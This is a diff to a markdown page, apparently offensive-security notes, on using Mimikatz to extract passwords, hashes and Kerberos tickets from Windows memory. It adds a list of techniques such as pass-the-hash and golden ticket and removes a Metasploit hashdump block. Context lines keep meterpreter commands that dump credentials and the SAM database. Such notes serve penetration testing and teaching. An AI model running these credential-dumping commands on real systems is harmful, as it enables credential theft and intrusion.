@@ -2,6 +2,10 @@
 
 **Mimikatz** is a Windows post-exploitation tool. It allows fot the extraction of clear-text passwords, hashes and kerberos tickets from memory.
 
+Allow us to perform: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Silver Ticket, and Golden Ticket.
+
+
+
 **Required**:
 
 * **pwd the target** with shell/meterpreter
@@ -25,16 +29,6 @@ creds_all
 <strong># dump from SAM db
 </strong>lsa_dump_sam
 </code></pre>
-
-
-
-{% code title="Metasploit" %}
-```bash
-use post/windows/gather/hashdump
-set SESSION
-run
-```
-{% endcode %}
 
 
 
